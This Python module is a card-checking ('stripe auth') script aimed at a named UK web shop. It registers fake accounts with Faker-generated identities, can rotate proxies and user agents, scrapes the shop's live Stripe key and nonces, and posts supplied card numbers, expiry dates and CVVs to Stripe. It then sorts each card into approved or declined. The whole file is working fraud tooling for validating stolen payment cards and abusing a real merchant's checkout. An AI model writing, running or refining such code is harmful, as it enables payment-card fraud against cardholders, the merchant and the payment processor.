import requests
import random
import re
import json
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

fake = Faker()
domain = "https://thepeppermintshop.co.uk"

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

def _run_stripe_auth_peppermint(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    u = generate_user_agent()
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(10000, 999999)}@gmail.com"

    headers = {
        'authority': 'thepeppermintshop.co.uk',
        'user-agent': u,
    }

    try:
        # 1. Get Register Nonce
        mori = session.get(f'{domain}/my-account/add-payment-method/', headers=headers, timeout=15)
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', mori.text)
        if not nonce_match:
            return False, "Failed to get registration nonce from Peppermint site"
        ft = nonce_match.group(1)

        # 2. Register
        skiplow = {
            'email': email,
            'password': 'aaar@123',
            'wc_order_attribution_user_agent': u,
            'woocommerce-register-nonce': ft,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }
        
        session.post(f'{domain}/my-account/add-payment-method/', headers=headers, data=skiplow, timeout=15)

        # 3. Get Key & Nonce
        resp_method = session.get(f'{domain}/my-account/add-payment-method/', headers=headers, timeout=15)
        html = resp_method.text
        
        pk_match = re.search(r'(pk_live_[a-zA-Z0-9]+)', html)
        if not pk_match:
            return False, "Failed to extract Stripe Live PK from Peppermint"
        pkk = pk_match.group(1)
        
        nonce_intent_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        if not nonce_intent_match:
            return False, "Failed to extract SetupIntent Nonce from Peppermint"
        vag = nonce_intent_match.group(1)

        # 4. Stripe Payment Method Creation
        headers_stripe = {
            'authority': 'api.stripe.com',
            'user-agent': u,
        }
        
        year_str = str(ano)
        exp_year = year_str[-2:] if len(year_str) >= 2 else year_str
        exp_month = str(mes)
        
        data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent&key={pkk}'
        
        resp_pm = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=15)
        if resp_pm.status_code != 200:
            err_data = resp_pm.json()
            err_msg = err_data.get('error', {}).get('message', 'Failed to create payment method')
            return False, err_msg
            
        pm_id = resp_pm.json().get('id')
        if not pm_id:
            return False, "Failed to get Payment Method ID from Stripe response"

        # 5. Confirm setup intent
        headers_conf = {
            'authority': 'thepeppermintshop.co.uk',
            'user-agent': u,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data_conf = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': vag,
        }
        
        resp_conf = session.post(f'{domain}/wp-admin/admin-ajax.php', headers=headers_conf, data=data_conf, timeout=20)
        r5 = resp_conf.text

        if r5.strip() == "0":
            return False, "Session expired or registration failed (0)"
        elif 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
            return False, 'Your card was declined'
        elif 'success' in r5.lower():
            return True, "CARD_APPROVED"
        elif 'funds' in r5.lower() or 'insufficient' in r5.lower():
            return True, "Approved - Insufficient"
        elif 'incorrect_number' in r5 or 'Your card number is incorrect.' in r5:
            return False, 'CVC Error'
        else:
            try:
                rjson = json.loads(r5)
                err_msg = rjson.get('data', {}).get('error', {}).get('message')
                if not err_msg and 'data' in rjson and 'error' in rjson['data']:
                    err_msg = rjson['data']['error']
                return False, err_msg or r5[:100]
            except Exception:
                return False, r5[:100]

    except requests.exceptions.RequestException:
        return False, "Connection error or timeout"
    except Exception as e:
        return False, f"Peppermint check failed: {str(e)}"

async def process_stripe_auth_peppermint(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_stripe_auth_peppermint, cc, mes, ano, cvv, proxy_str)
